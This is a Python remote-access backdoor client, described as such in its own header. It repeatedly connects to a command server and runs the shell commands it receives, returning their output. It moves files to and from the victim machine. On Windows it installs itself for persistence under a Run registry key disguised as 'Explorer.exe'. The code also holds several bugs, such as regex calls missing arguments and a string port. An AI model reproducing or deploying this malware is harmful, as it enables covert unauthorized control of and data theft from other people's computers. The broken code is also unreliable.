'''
    author  : zerobits01
    created : 25-Jan-2020
    modified: 28-Jan-2020
    purpose : connecting to backdoor server and gives us remote access
'''

import socket
import subprocess
import json
import time
import shutil
import os,sys
import re

HOST = lambda : '127.0.0.1'
PORT = lambda : '0101'
unix_base = False

def saveFile(jsondata, filename):
    json_string = jsondata.decode('utf-8')
    data_to_write = json.loads(json_string)[filename]
    with open(file=filename, mode='wb') as f:
        f.writelines(data_to_write)

def sendFile(filename):
    with open(file=filename, mode='rb') as f:
        if f.readable():
            data_to_send = f.readlines()
            data_to_send = {filename: ''.join(data_to_send)}
            return data_to_send
        else:
            return 'couldn\'t send file '

def change_working_directory_to(path):
    os.chdir(path)
    return "[+] Change working directory to " + path

def check_if_unix_base():
    global unix_base
    exitcode = subprocess.call('uname -a')
    if exitcode == 0 :
        unix_base = True
        return 'unix'
    else :
        unix_base = False
        return 'windows'

def execute(cmnd,s):
    if re.match(r'^\s*ls\s*$',cmnd) :
        if unix_base:
            s.sendall(subprocess.check_output('ls', shell=True))
        else :
            s.sendall(subprocess.check_output('dir', shell=True))
    elif re.match(r'^\s*pwd\s*$',cmnd) :
        if unix_base :
            s.sendall(subprocess.check_output('pwd',shell=True))
        else :
            s.sendall(subprocess.check_output('echo %cd%', shell=True))
    elif re.match(r'^\s*cd\s+(?P<path>\S+)\s*$',cmnd):
        s.sendall(change_working_directory_to(re.search(r'^\s*cd\s+(?P<path>\S+)\s*$').group('path')))
    elif re.match(r'^\s*checkos\s*$',cmnd):
        s.sendall(check_if_unix_base())
    elif re.match(r'^\s*download\s+(?P<filename>\S+)\s*$') :
        filename = re.search(r'^\s*download\s+(?P<filename>\S+)\s*$').group('filename')
        s.sendall(sendFile(filename))
    elif re.match(r'^\s*upload\s+(?P<filename>\S+)\s*$') :
        filename = re.search(r'^\s*upload\s+(?P<filename>\S+)\s*$').group('filename')
        filepath = os.path.join(os.path.abspath(sys.argv[0]),filename)
        saveFile(s.recv(1024),filepath)
    else:
        s.sendall(subprocess.check_output(cmnd))

def winAddReg():
    appdata = os.environ('appdata')
    filename = sys.argv[0]
    currpath= os.path.abspath(filename)
    shutil.move(currpath,appdata)
    filepath = os.path.join(appdata,filename)
    regpath = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
    regadd = f'reg add {regpath} /v Explorer.exe /t REG_SZ /d {filepath}'
    subprocess.call(regadd)
    return 'added to registery. done!!'

# TODO : also we can use crontab or anacron with @reboot or once a day to add
#  the app to startup in linux and unix base systems

while True:
    check_if_unix_base()
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        while True:
            try:
                s.connect((HOST(), PORT()))
                break
            except Exception:
                time.sleep(10)

        while True :
            data = s.recv(1024)
            execute(data,s)
